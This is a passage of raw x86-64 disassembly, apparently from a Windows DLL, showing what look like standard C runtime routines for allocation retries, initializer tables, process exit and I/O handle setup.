   180002c88:	74 1e                	je     0x180002ca8
   180002c8a:	33 d2                	xor    %edx,%edx
   180002c8c:	48 8b cb             	mov    %rbx,%rcx
   180002c8f:	e8 cc fc ff ff       	call   0x180002960
   180002c94:	ff 15 a6 63 00 00    	call   *0x63a6(%rip)        # 0x180009040
   180002c9a:	48 83 4b 08 ff       	orq    $0xffffffffffffffff,0x8(%rbx)
   180002c9f:	89 03                	mov    %eax,(%rbx)
   180002ca1:	b8 01 00 00 00       	mov    $0x1,%eax
   180002ca6:	eb 07                	jmp    0x180002caf
   180002ca8:	e8 8b fc ff ff       	call   0x180002938
   180002cad:	33 c0                	xor    %eax,%eax
   180002caf:	48 83 c4 20          	add    $0x20,%rsp
   180002cb3:	5b                   	pop    %rbx
   180002cb4:	c3                   	ret
   180002cb5:	cc                   	int3
   180002cb6:	cc                   	int3
   180002cb7:	cc                   	int3
   180002cb8:	48 85 c9             	test   %rcx,%rcx
   180002cbb:	74 37                	je     0x180002cf4
   180002cbd:	53                   	push   %rbx
   180002cbe:	48 83 ec 20          	sub    $0x20,%rsp
   180002cc2:	4c 8b c1             	mov    %rcx,%r8
   180002cc5:	48 8b 0d 7c a8 00 00 	mov    0xa87c(%rip),%rcx        # 0x18000d548
   180002ccc:	33 d2                	xor    %edx,%edx
   180002cce:	ff 15 04 64 00 00    	call   *0x6404(%rip)        # 0x1800090d8
   180002cd4:	85 c0                	test   %eax,%eax
   180002cd6:	75 17                	jne    0x180002cef
   180002cd8:	e8 c3 f9 ff ff       	call   0x1800026a0
   180002cdd:	48 8b d8             	mov    %rax,%rbx
   180002ce0:	ff 15 e2 63 00 00    	call   *0x63e2(%rip)        # 0x1800090c8
   180002ce6:	8b c8                	mov    %eax,%ecx
   180002ce8:	e8 6b f9 ff ff       	call   0x180002658
   180002ced:	89 03                	mov    %eax,(%rbx)
   180002cef:	48 83 c4 20          	add    $0x20,%rsp
   180002cf3:	5b                   	pop    %rbx
   180002cf4:	c3                   	ret
   180002cf5:	cc                   	int3
   180002cf6:	cc                   	int3
   180002cf7:	cc                   	int3
   180002cf8:	48 8b c4             	mov    %rsp,%rax
   180002cfb:	48 89 58 08          	mov    %rbx,0x8(%rax)
   180002cff:	48 89 68 10          	mov    %rbp,0x10(%rax)
   180002d03:	48 89 70 18          	mov    %rsi,0x18(%rax)
   180002d07:	48 89 78 20          	mov    %rdi,0x20(%rax)
   180002d0b:	41 54                	push   %r12
   180002d0d:	48 83 ec 20          	sub    $0x20,%rsp
   180002d11:	8b 3d c1 a6 00 00    	mov    0xa6c1(%rip),%edi        # 0x18000d3d8
   180002d17:	33 ed                	xor    %ebp,%ebp
   180002d19:	48 8b f1             	mov    %rcx,%rsi
   180002d1c:	41 83 cc ff          	or     $0xffffffff,%r12d
   180002d20:	48 8b ce             	mov    %rsi,%rcx
   180002d23:	e8 fc 30 00 00       	call   0x180005e24
   180002d28:	48 8b d8             	mov    %rax,%rbx
   180002d2b:	48 85 c0             	test   %rax,%rax
   180002d2e:	75 28                	jne    0x180002d58
   180002d30:	85 ff                	test   %edi,%edi
   180002d32:	74 24                	je     0x180002d58
   180002d34:	8b cd                	mov    %ebp,%ecx
   180002d36:	ff 15 a4 63 00 00    	call   *0x63a4(%rip)        # 0x1800090e0
   180002d3c:	8b 3d 96 a6 00 00    	mov    0xa696(%rip),%edi        # 0x18000d3d8
   180002d42:	44 8d 9d e8 03 00 00 	lea    0x3e8(%rbp),%r11d
   180002d49:	44 3b df             	cmp    %edi,%r11d
   180002d4c:	41 8b eb             	mov    %r11d,%ebp
   180002d4f:	41 0f 47 ec          	cmova  %r12d,%ebp
   180002d53:	41 3b ec             	cmp    %r12d,%ebp
   180002d56:	75 c8                	jne    0x180002d20
   180002d58:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   180002d5d:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   180002d62:	48 8b 7c 24 48       	mov    0x48(%rsp),%rdi
   180002d67:	48 8b c3             	mov    %rbx,%rax
   180002d6a:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   180002d6f:	48 83 c4 20          	add    $0x20,%rsp
   180002d73:	41 5c                	pop    %r12
   180002d75:	c3                   	ret
   180002d76:	cc                   	int3
   180002d77:	cc                   	int3
   180002d78:	48 8b c4             	mov    %rsp,%rax
   180002d7b:	48 89 58 08          	mov    %rbx,0x8(%rax)
   180002d7f:	48 89 68 10          	mov    %rbp,0x10(%rax)
   180002d83:	48 89 70 18          	mov    %rsi,0x18(%rax)
   180002d87:	48 89 78 20          	mov    %rdi,0x20(%rax)
   180002d8b:	41 54                	push   %r12
   180002d8d:	48 83 ec 20          	sub    $0x20,%rsp
   180002d91:	33 ff                	xor    %edi,%edi
   180002d93:	48 8b f2             	mov    %rdx,%rsi
   180002d96:	48 8b e9             	mov    %rcx,%rbp
   180002d99:	41 83 cc ff          	or     $0xffffffff,%r12d
   180002d9d:	45 33 c0             	xor    %r8d,%r8d
   180002da0:	48 8b d6             	mov    %rsi,%rdx
   180002da3:	48 8b cd             	mov    %rbp,%rcx
   180002da6:	e8 31 31 00 00       	call   0x180005edc
   180002dab:	48 8b d8             	mov    %rax,%rbx
   180002dae:	48 85 c0             	test   %rax,%rax
   180002db1:	75 2a                	jne    0x180002ddd
   180002db3:	39 05 1f a6 00 00    	cmp    %eax,0xa61f(%rip)        # 0x18000d3d8
   180002db9:	76 22                	jbe    0x180002ddd
   180002dbb:	8b cf                	mov    %edi,%ecx
   180002dbd:	ff 15 1d 63 00 00    	call   *0x631d(%rip)        # 0x1800090e0
   180002dc3:	44 8d 9f e8 03 00 00 	lea    0x3e8(%rdi),%r11d
   180002dca:	44 3b 1d 07 a6 00 00 	cmp    0xa607(%rip),%r11d        # 0x18000d3d8
   180002dd1:	41 8b fb             	mov    %r11d,%edi
   180002dd4:	41 0f 47 fc          	cmova  %r12d,%edi
   180002dd8:	41 3b fc             	cmp    %r12d,%edi
   180002ddb:	75 c0                	jne    0x180002d9d
   180002ddd:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   180002de2:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   180002de7:	48 8b 7c 24 48       	mov    0x48(%rsp),%rdi
   180002dec:	48 8b c3             	mov    %rbx,%rax
   180002def:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   180002df4:	48 83 c4 20          	add    $0x20,%rsp
   180002df8:	41 5c                	pop    %r12
   180002dfa:	c3                   	ret
   180002dfb:	cc                   	int3
   180002dfc:	48 8b c4             	mov    %rsp,%rax
   180002dff:	48 89 58 08          	mov    %rbx,0x8(%rax)
   180002e03:	48 89 68 10          	mov    %rbp,0x10(%rax)
   180002e07:	48 89 70 18          	mov    %rsi,0x18(%rax)
   180002e0b:	48 89 78 20          	mov    %rdi,0x20(%rax)
   180002e0f:	41 54                	push   %r12
   180002e11:	48 83 ec 20          	sub    $0x20,%rsp
   180002e15:	33 f6                	xor    %esi,%esi
   180002e17:	48 8b fa             	mov    %rdx,%rdi
   180002e1a:	48 8b e9             	mov    %rcx,%rbp
   180002e1d:	41 83 cc ff          	or     $0xffffffff,%r12d
   180002e21:	48 8b d7             	mov    %rdi,%rdx
   180002e24:	48 8b cd             	mov    %rbp,%rcx
   180002e27:	e8 4c 31 00 00       	call   0x180005f78
   180002e2c:	48 8b d8             	mov    %rax,%rbx
   180002e2f:	48 85 c0             	test   %rax,%rax
   180002e32:	75 2f                	jne    0x180002e63
   180002e34:	48 85 ff             	test   %rdi,%rdi
   180002e37:	74 2a                	je     0x180002e63
   180002e39:	39 05 99 a5 00 00    	cmp    %eax,0xa599(%rip)        # 0x18000d3d8
   180002e3f:	76 22                	jbe    0x180002e63
   180002e41:	8b ce                	mov    %esi,%ecx
   180002e43:	ff 15 97 62 00 00    	call   *0x6297(%rip)        # 0x1800090e0
   180002e49:	44 8d 9e e8 03 00 00 	lea    0x3e8(%rsi),%r11d
   180002e50:	44 3b 1d 81 a5 00 00 	cmp    0xa581(%rip),%r11d        # 0x18000d3d8
   180002e57:	41 8b f3             	mov    %r11d,%esi
   180002e5a:	41 0f 47 f4          	cmova  %r12d,%esi
   180002e5e:	41 3b f4             	cmp    %r12d,%esi
   180002e61:	75 be                	jne    0x180002e21
   180002e63:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   180002e68:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   180002e6d:	48 8b 7c 24 48       	mov    0x48(%rsp),%rdi
   180002e72:	48 8b c3             	mov    %rbx,%rax
   180002e75:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   180002e7a:	48 83 c4 20          	add    $0x20,%rsp
   180002e7e:	41 5c                	pop    %r12
   180002e80:	c3                   	ret
   180002e81:	cc                   	int3
   180002e82:	cc                   	int3
   180002e83:	cc                   	int3
   180002e84:	40 53                	rex push %rbx
   180002e86:	48 83 ec 20          	sub    $0x20,%rsp
   180002e8a:	8b d9                	mov    %ecx,%ebx
   180002e8c:	48 8d 0d dd 64 00 00 	lea    0x64dd(%rip),%rcx        # 0x180009370
   180002e93:	ff 15 57 62 00 00    	call   *0x6257(%rip)        # 0x1800090f0
   180002e99:	48 85 c0             	test   %rax,%rax
   180002e9c:	74 19                	je     0x180002eb7
   180002e9e:	48 8d 15 bb 64 00 00 	lea    0x64bb(%rip),%rdx        # 0x180009360
   180002ea5:	48 8b c8             	mov    %rax,%rcx
   180002ea8:	ff 15 3a 62 00 00    	call   *0x623a(%rip)        # 0x1800090e8
   180002eae:	48 85 c0             	test   %rax,%rax
   180002eb1:	74 04                	je     0x180002eb7
   180002eb3:	8b cb                	mov    %ebx,%ecx
   180002eb5:	ff d0                	call   *%rax
   180002eb7:	48 83 c4 20          	add    $0x20,%rsp
   180002ebb:	5b                   	pop    %rbx
   180002ebc:	c3                   	ret
   180002ebd:	cc                   	int3
   180002ebe:	cc                   	int3
   180002ebf:	cc                   	int3
   180002ec0:	40 53                	rex push %rbx
   180002ec2:	48 83 ec 20          	sub    $0x20,%rsp
   180002ec6:	8b d9                	mov    %ecx,%ebx
   180002ec8:	e8 b7 ff ff ff       	call   0x180002e84
   180002ecd:	8b cb                	mov    %ebx,%ecx
   180002ecf:	ff 15 23 62 00 00    	call   *0x6223(%rip)        # 0x1800090f8
   180002ed5:	cc                   	int3
   180002ed6:	cc                   	int3
   180002ed7:	cc                   	int3
   180002ed8:	b9 08 00 00 00       	mov    $0x8,%ecx
   180002edd:	e9 fe 2e 00 00       	jmp    0x180005de0
   180002ee2:	cc                   	int3
   180002ee3:	cc                   	int3
   180002ee4:	b9 08 00 00 00       	mov    $0x8,%ecx
   180002ee9:	e9 f2 2d 00 00       	jmp    0x180005ce0
   180002eee:	cc                   	int3
   180002eef:	cc                   	int3
   180002ef0:	40 53                	rex push %rbx
   180002ef2:	48 83 ec 20          	sub    $0x20,%rsp
   180002ef6:	e8 2d fa ff ff       	call   0x180002928
   180002efb:	48 8b c8             	mov    %rax,%rcx
   180002efe:	48 8b d8             	mov    %rax,%rbx
   180002f01:	e8 fe 33 00 00       	call   0x180006304
   180002f06:	48 8b cb             	mov    %rbx,%rcx
   180002f09:	e8 32 f5 ff ff       	call   0x180002440
   180002f0e:	48 8b cb             	mov    %rbx,%rcx
   180002f11:	e8 e6 33 00 00       	call   0x1800062fc
   180002f16:	48 8b cb             	mov    %rbx,%rcx
   180002f19:	e8 d6 33 00 00       	call   0x1800062f4
   180002f1e:	48 8b cb             	mov    %rbx,%rcx
   180002f21:	e8 6a 31 00 00       	call   0x180006090
   180002f26:	48 8b cb             	mov    %rbx,%rcx
   180002f29:	48 83 c4 20          	add    $0x20,%rsp
   180002f2d:	5b                   	pop    %rbx
   180002f2e:	e9 3d 31 00 00       	jmp    0x180006070
   180002f33:	cc                   	int3
   180002f34:	48 3b ca             	cmp    %rdx,%rcx
   180002f37:	73 2d                	jae    0x180002f66
   180002f39:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180002f3e:	57                   	push   %rdi
   180002f3f:	48 83 ec 20          	sub    $0x20,%rsp
   180002f43:	48 8b fa             	mov    %rdx,%rdi
   180002f46:	48 8b d9             	mov    %rcx,%rbx
   180002f49:	48 8b 03             	mov    (%rbx),%rax
   180002f4c:	48 85 c0             	test   %rax,%rax
   180002f4f:	74 02                	je     0x180002f53
   180002f51:	ff d0                	call   *%rax
   180002f53:	48 83 c3 08          	add    $0x8,%rbx
   180002f57:	48 3b df             	cmp    %rdi,%rbx
   180002f5a:	72 ed                	jb     0x180002f49
   180002f5c:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   180002f61:	48 83 c4 20          	add    $0x20,%rsp
   180002f65:	5f                   	pop    %rdi
   180002f66:	c3                   	ret
   180002f67:	cc                   	int3
   180002f68:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180002f6d:	57                   	push   %rdi
   180002f6e:	48 83 ec 20          	sub    $0x20,%rsp
   180002f72:	33 c0                	xor    %eax,%eax
   180002f74:	48 8b fa             	mov    %rdx,%rdi
   180002f77:	48 8b d9             	mov    %rcx,%rbx
   180002f7a:	48 3b ca             	cmp    %rdx,%rcx
   180002f7d:	73 17                	jae    0x180002f96
   180002f7f:	85 c0                	test   %eax,%eax
   180002f81:	75 13                	jne    0x180002f96
   180002f83:	48 8b 0b             	mov    (%rbx),%rcx
   180002f86:	48 85 c9             	test   %rcx,%rcx
   180002f89:	74 02                	je     0x180002f8d
   180002f8b:	ff d1                	call   *%rcx
   180002f8d:	48 83 c3 08          	add    $0x8,%rbx
   180002f91:	48 3b df             	cmp    %rdi,%rbx
   180002f94:	72 e9                	jb     0x180002f7f
   180002f96:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   180002f9b:	48 83 c4 20          	add    $0x20,%rsp
   180002f9f:	5f                   	pop    %rdi
   180002fa0:	c3                   	ret
   180002fa1:	cc                   	int3
   180002fa2:	cc                   	int3
   180002fa3:	cc                   	int3
   180002fa4:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180002fa9:	57                   	push   %rdi
   180002faa:	48 83 ec 20          	sub    $0x20,%rsp
   180002fae:	48 83 3d 8a c6 00 00 	cmpq   $0x0,0xc68a(%rip)        # 0x18000f640
   180002fb5:	00 
   180002fb6:	8b d9                	mov    %ecx,%ebx
   180002fb8:	74 18                	je     0x180002fd2
   180002fba:	48 8d 0d 7f c6 00 00 	lea    0xc67f(%rip),%rcx        # 0x18000f640
   180002fc1:	e8 ca 2b 00 00       	call   0x180005b90
   180002fc6:	85 c0                	test   %eax,%eax
   180002fc8:	74 08                	je     0x180002fd2
   180002fca:	8b cb                	mov    %ebx,%ecx
   180002fcc:	ff 15 6e c6 00 00    	call   *0xc66e(%rip)        # 0x18000f640
   180002fd2:	e8 89 27 00 00       	call   0x180005760
   180002fd7:	48 8d 15 92 62 00 00 	lea    0x6292(%rip),%rdx        # 0x180009270
   180002fde:	48 8d 0d 6b 62 00 00 	lea    0x626b(%rip),%rcx        # 0x180009250
   180002fe5:	e8 7e ff ff ff       	call   0x180002f68
   180002fea:	85 c0                	test   %eax,%eax
   180002fec:	75 5a                	jne    0x180003048
   180002fee:	48 8d 0d 9f 0a 00 00 	lea    0xa9f(%rip),%rcx        # 0x180003a94
   180002ff5:	e8 96 34 00 00       	call   0x180006490
   180002ffa:	48 8d 1d 3f 62 00 00 	lea    0x623f(%rip),%rbx        # 0x180009240
   180003001:	48 8d 3d 40 62 00 00 	lea    0x6240(%rip),%rdi        # 0x180009248
   180003008:	eb 0e                	jmp    0x180003018
   18000300a:	48 8b 03             	mov    (%rbx),%rax
   18000300d:	48 85 c0             	test   %rax,%rax
   180003010:	74 02                	je     0x180003014
   180003012:	ff d0                	call   *%rax
   180003014:	48 83 c3 08          	add    $0x8,%rbx
   180003018:	48 3b df             	cmp    %rdi,%rbx
   18000301b:	72 ed                	jb     0x18000300a
   18000301d:	48 83 3d 23 c6 00 00 	cmpq   $0x0,0xc623(%rip)        # 0x18000f648
   180003024:	00 
   180003025:	74 1f                	je     0x180003046
   180003027:	48 8d 0d 1a c6 00 00 	lea    0xc61a(%rip),%rcx        # 0x18000f648
   18000302e:	e8 5d 2b 00 00       	call   0x180005b90
   180003033:	85 c0                	test   %eax,%eax
   180003035:	74 0f                	je     0x180003046
   180003037:	45 33 c0             	xor    %r8d,%r8d
   18000303a:	33 c9                	xor    %ecx,%ecx
   18000303c:	41 8d 50 02          	lea    0x2(%r8),%edx
   180003040:	ff 15 02 c6 00 00    	call   *0xc602(%rip)        # 0x18000f648
   180003046:	33 c0                	xor    %eax,%eax
   180003048:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   18000304d:	48 83 c4 20          	add    $0x20,%rsp
   180003051:	5f                   	pop    %rdi
   180003052:	c3                   	ret
   180003053:	cc                   	int3
   180003054:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180003059:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   18000305e:	44 89 44 24 18       	mov    %r8d,0x18(%rsp)
   180003063:	57                   	push   %rdi
   180003064:	41 54                	push   %r12
   180003066:	41 55                	push   %r13
   180003068:	41 56                	push   %r14
   18000306a:	41 57                	push   %r15
   18000306c:	48 83 ec 40          	sub    $0x40,%rsp
   180003070:	45 8b e0             	mov    %r8d,%r12d
   180003073:	8b da                	mov    %edx,%ebx
   180003075:	44 8b f9             	mov    %ecx,%r15d
   180003078:	b9 08 00 00 00       	mov    $0x8,%ecx
   18000307d:	e8 5e 2d 00 00       	call   0x180005de0
   180003082:	90                   	nop
   180003083:	83 3d a6 a3 00 00 01 	cmpl   $0x1,0xa3a6(%rip)        # 0x18000d430
   18000308a:	0f 84 01 01 00 00    	je     0x180003191
   180003090:	c7 05 92 a3 00 00 01 	movl   $0x1,0xa392(%rip)        # 0x18000d42c
   180003097:	00 00 00 
   18000309a:	44 88 25 87 a3 00 00 	mov    %r12b,0xa387(%rip)        # 0x18000d428
   1800030a1:	85 db                	test   %ebx,%ebx
   1800030a3:	0f 85 d4 00 00 00    	jne    0x18000317d
   1800030a9:	48 8b 0d 80 c5 00 00 	mov    0xc580(%rip),%rcx        # 0x18000f630
   1800030b0:	ff 15 a2 5f 00 00    	call   *0x5fa2(%rip)        # 0x180009058
   1800030b6:	48 8b f0             	mov    %rax,%rsi
   1800030b9:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   1800030be:	48 85 c0             	test   %rax,%rax
   1800030c1:	0f 84 a3 00 00 00    	je     0x18000316a
   1800030c7:	48 8b 0d 5a c5 00 00 	mov    0xc55a(%rip),%rcx        # 0x18000f628
   1800030ce:	ff 15 84 5f 00 00    	call   *0x5f84(%rip)        # 0x180009058
   1800030d4:	48 8b f8             	mov    %rax,%rdi
   1800030d7:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   1800030dc:	4c 8b f6             	mov    %rsi,%r14
   1800030df:	48 89 74 24 28       	mov    %rsi,0x28(%rsp)
   1800030e4:	4c 8b e8             	mov    %rax,%r13
   1800030e7:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   1800030ec:	48 83 ef 08          	sub    $0x8,%rdi
   1800030f0:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   1800030f5:	48 3b fe             	cmp    %rsi,%rdi
   1800030f8:	72 70                	jb     0x18000316a
   1800030fa:	e8 29 f8 ff ff       	call   0x180002928
   1800030ff:	48 39 07             	cmp    %rax,(%rdi)
   180003102:	75 02                	jne    0x180003106
   180003104:	eb e6                	jmp    0x1800030ec
   180003106:	48 3b fe             	cmp    %rsi,%rdi
   180003109:	72 5f                	jb     0x18000316a
   18000310b:	48 8b 0f             	mov    (%rdi),%rcx
   18000310e:	ff 15 44 5f 00 00    	call   *0x5f44(%rip)        # 0x180009058
   180003114:	48 8b d8             	mov    %rax,%rbx
   180003117:	e8 0c f8 ff ff       	call   0x180002928
   18000311c:	48 89 07             	mov    %rax,(%rdi)
   18000311f:	ff d3                	call   *%rbx
   180003121:	48 8b 0d 08 c5 00 00 	mov    0xc508(%rip),%rcx        # 0x18000f630
   180003128:	ff 15 2a 5f 00 00    	call   *0x5f2a(%rip)        # 0x180009058
   18000312e:	48 8b d8             	mov    %rax,%rbx
   180003131:	48 8b 0d f0 c4 00 00 	mov    0xc4f0(%rip),%rcx        # 0x18000f628
   180003138:	ff 15 1a 5f 00 00    	call   *0x5f1a(%rip)        # 0x180009058
   18000313e:	4c 3b f3             	cmp    %rbx,%r14
   180003141:	75 05                	jne    0x180003148
   180003143:	4c 3b e8             	cmp    %rax,%r13
   180003146:	74 bc                	je     0x180003104
   180003148:	4c 8b f3             	mov    %rbx,%r14
   18000314b:	48 89 5c 24 28       	mov    %rbx,0x28(%rsp)
   180003150:	48 8b f3             	mov    %rbx,%rsi
   180003153:	48 89 5c 24 30       	mov    %rbx,0x30(%rsp)
   180003158:	4c 8b e8             	mov    %rax,%r13
   18000315b:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   180003160:	48 8b f8             	mov    %rax,%rdi
   180003163:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   180003168:	eb 9a                	jmp    0x180003104
   18000316a:	48 8d 15 1f 61 00 00 	lea    0x611f(%rip),%rdx        # 0x180009290
   180003171:	48 8d 0d 00 61 00 00 	lea    0x6100(%rip),%rcx        # 0x180009278
   180003178:	e8 b7 fd ff ff       	call   0x180002f34
   18000317d:	48 8d 15 1c 61 00 00 	lea    0x611c(%rip),%rdx        # 0x1800092a0
   180003184:	48 8d 0d 0d 61 00 00 	lea    0x610d(%rip),%rcx        # 0x180009298
   18000318b:	e8 a4 fd ff ff       	call   0x180002f34
   180003190:	90                   	nop
   180003191:	45 85 e4             	test   %r12d,%r12d
   180003194:	74 0f                	je     0x1800031a5
   180003196:	b9 08 00 00 00       	mov    $0x8,%ecx
   18000319b:	e8 40 2b 00 00       	call   0x180005ce0
   1800031a0:	45 85 e4             	test   %r12d,%r12d
   1800031a3:	75 26                	jne    0x1800031cb
   1800031a5:	c7 05 81 a2 00 00 01 	movl   $0x1,0xa281(%rip)        # 0x18000d430
   1800031ac:	00 00 00 
   1800031af:	b9 08 00 00 00       	mov    $0x8,%ecx
   1800031b4:	e8 27 2b 00 00       	call   0x180005ce0
   1800031b9:	41 8b cf             	mov    %r15d,%ecx
   1800031bc:	e8 c3 fc ff ff       	call   0x180002e84
   1800031c1:	41 8b cf             	mov    %r15d,%ecx
   1800031c4:	ff 15 2e 5f 00 00    	call   *0x5f2e(%rip)        # 0x1800090f8
   1800031ca:	cc                   	int3
   1800031cb:	48 8b 5c 24 70       	mov    0x70(%rsp),%rbx
   1800031d0:	48 8b 74 24 78       	mov    0x78(%rsp),%rsi
   1800031d5:	48 83 c4 40          	add    $0x40,%rsp
   1800031d9:	41 5f                	pop    %r15
   1800031db:	41 5e                	pop    %r14
   1800031dd:	41 5d                	pop    %r13
   1800031df:	41 5c                	pop    %r12
   1800031e1:	5f                   	pop    %rdi
   1800031e2:	c3                   	ret
   1800031e3:	cc                   	int3
   1800031e4:	45 33 c0             	xor    %r8d,%r8d
   1800031e7:	41 8d 50 01          	lea    0x1(%r8),%edx
   1800031eb:	e9 64 fe ff ff       	jmp    0x180003054
   1800031f0:	33 d2                	xor    %edx,%edx
   1800031f2:	33 c9                	xor    %ecx,%ecx
   1800031f4:	44 8d 42 01          	lea    0x1(%rdx),%r8d
   1800031f8:	e9 57 fe ff ff       	jmp    0x180003054
   1800031fd:	cc                   	int3
   1800031fe:	cc                   	int3
   1800031ff:	cc                   	int3
   180003200:	40 53                	rex push %rbx
   180003202:	48 83 ec 20          	sub    $0x20,%rsp
   180003206:	8b d9                	mov    %ecx,%ebx
   180003208:	e8 27 35 00 00       	call   0x180006734
   18000320d:	8b cb                	mov    %ebx,%ecx
   18000320f:	e8 c0 32 00 00       	call   0x1800064d4
   180003214:	45 33 c0             	xor    %r8d,%r8d
   180003217:	b9 ff 00 00 00       	mov    $0xff,%ecx
   18000321c:	41 8d 50 01          	lea    0x1(%r8),%edx
   180003220:	e8 2f fe ff ff       	call   0x180003054
   180003225:	cc                   	int3
   180003226:	cc                   	int3
   180003227:	cc                   	int3
   180003228:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   18000322d:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   180003232:	48 89 7c 24 18       	mov    %rdi,0x18(%rsp)
   180003237:	41 54                	push   %r12
   180003239:	41 55                	push   %r13
   18000323b:	41 56                	push   %r14
   18000323d:	48 81 ec 90 00 00 00 	sub    $0x90,%rsp
   180003244:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   180003249:	ff 15 d1 5e 00 00    	call   *0x5ed1(%rip)        # 0x180009120
   18000324f:	ba 58 00 00 00       	mov    $0x58,%edx
   180003254:	8d 6a c8             	lea    -0x38(%rdx),%ebp
   180003257:	8b cd                	mov    %ebp,%ecx
   180003259:	e8 1a fb ff ff       	call   0x180002d78
   18000325e:	45 33 f6             	xor    %r14d,%r14d
   180003261:	48 8b d0             	mov    %rax,%rdx
   180003264:	48 85 c0             	test   %rax,%rax
   180003267:	75 08                	jne    0x180003271
   180003269:	83 c8 ff             	or     $0xffffffff,%eax
   18000326c:	e9 6b 02 00 00       	jmp    0x1800034dc
   180003271:	48 89 05 a8 c1 00 00 	mov    %rax,0xc1a8(%rip)        # 0x18000f420
   180003278:	48 05 00 0b 00 00    	add    $0xb00,%rax
   18000327e:	8b cd                	mov    %ebp,%ecx
   180003280:	89 0d 7e c1 00 00    	mov    %ecx,0xc17e(%rip)        # 0x18000f404
   180003286:	48 3b d0             	cmp    %rax,%rdx
   180003289:	73 45                	jae    0x1800032d0
   18000328b:	48 83 c2 09          	add    $0x9,%rdx
   18000328f:	48 83 4a f7 ff       	orq    $0xffffffffffffffff,-0x9(%rdx)
   180003294:	66 c7 42 ff 00 0a    	movw   $0xa00,-0x1(%rdx)
   18000329a:	44 89 72 03          	mov    %r14d,0x3(%rdx)
   18000329e:	66 c7 42 2f 00 0a    	movw   $0xa00,0x2f(%rdx)
   1800032a4:	c6 42 31 0a          	movb   $0xa,0x31(%rdx)
   1800032a8:	44 89 72 47          	mov    %r14d,0x47(%rdx)
   1800032ac:	44 88 72 43          	mov    %r14b,0x43(%rdx)
   1800032b0:	48 8b 05 69 c1 00 00 	mov    0xc169(%rip),%rax        # 0x18000f420
   1800032b7:	48 83 c2 58          	add    $0x58,%rdx
   1800032bb:	48 8d 4a f7          	lea    -0x9(%rdx),%rcx
   1800032bf:	48 05 00 0b 00 00    	add    $0xb00,%rax
   1800032c5:	48 3b c8             	cmp    %rax,%rcx
   1800032c8:	72 c5                	jb     0x18000328f
   1800032ca:	8b 0d 34 c1 00 00    	mov    0xc134(%rip),%ecx        # 0x18000f404
   1800032d0:	66 44 39 74 24 62    	cmp    %r14w,0x62(%rsp)
   1800032d6:	0f 84 34 01 00 00    	je     0x180003410
   1800032dc:	48 8b 44 24 68       	mov    0x68(%rsp),%rax
   1800032e1:	48 85 c0             	test   %rax,%rax
   1800032e4:	0f 84 26 01 00 00    	je     0x180003410
   1800032ea:	4c 63 20             	movslq (%rax),%r12
   1800032ed:	bb 00 08 00 00       	mov    $0x800,%ebx
   1800032f2:	4c 8d 68 04          	lea    0x4(%rax),%r13
   1800032f6:	4d 03 e5             	add    %r13,%r12
   1800032f9:	39 18                	cmp    %ebx,(%rax)
   1800032fb:	0f 4c 18             	cmovl  (%rax),%ebx
   1800032fe:	3b cb                	cmp    %ebx,%ecx
   180003300:	0f 8d 87 00 00 00    	jge    0x18000338d
   180003306:	48 8d 3d 1b c1 00 00 	lea    0xc11b(%rip),%rdi        # 0x18000f428
   18000330d:	ba 58 00 00 00       	mov    $0x58,%edx
   180003312:	48 8b cd             	mov    %rbp,%rcx
   180003315:	e8 5e fa ff ff       	call   0x180002d78
   18000331a:	48 85 c0             	test   %rax,%rax
   18000331d:	74 68                	je     0x180003387
   18000331f:	8b 15 df c0 00 00    	mov    0xc0df(%rip),%edx        # 0x18000f404
   180003325:	48 8d 88 00 0b 00 00 	lea    0xb00(%rax),%rcx
   18000332c:	48 89 07             	mov    %rax,(%rdi)
   18000332f:	03 d5                	add    %ebp,%edx
   180003331:	89 15 cd c0 00 00    	mov    %edx,0xc0cd(%rip)        # 0x18000f404
   180003337:	48 3b c1             	cmp    %rcx,%rax
   18000333a:	73 41                	jae    0x18000337d
   18000333c:	48 8d 50 09          	lea    0x9(%rax),%rdx
   180003340:	48 83 4a f7 ff       	orq    $0xffffffffffffffff,-0x9(%rdx)
   180003345:	80 62 2f 80          	andb   $0x80,0x2f(%rdx)
   180003349:	66 c7 42 ff 00 0a    	movw   $0xa00,-0x1(%rdx)
   18000334f:	44 89 72 03          	mov    %r14d,0x3(%rdx)
   180003353:	66 c7 42 30 0a 0a    	movw   $0xa0a,0x30(%rdx)
   180003359:	44 89 72 47          	mov    %r14d,0x47(%rdx)
   18000335d:	44 88 72 43          	mov    %r14b,0x43(%rdx)
   180003361:	48 8b 07             	mov    (%rdi),%rax
   180003364:	48 83 c2 58          	add    $0x58,%rdx
   180003368:	48 8d 4a f7          	lea    -0x9(%rdx),%rcx
   18000336c:	48 05 00 0b 00 00    	add    $0xb00,%rax
   180003372:	48 3b c8             	cmp    %rax,%rcx
   180003375:	72 c9                	jb     0x180003340
   180003377:	8b 15 87 c0 00 00    	mov    0xc087(%rip),%edx        # 0x18000f404
   18000337d:	48 83 c7 08          	add    $0x8,%rdi
   180003381:	3b d3                	cmp    %ebx,%edx
   180003383:	7c 88                	jl     0x18000330d
   180003385:	eb 06                	jmp    0x18000338d
   180003387:	8b 1d 77 c0 00 00    	mov    0xc077(%rip),%ebx        # 0x18000f404
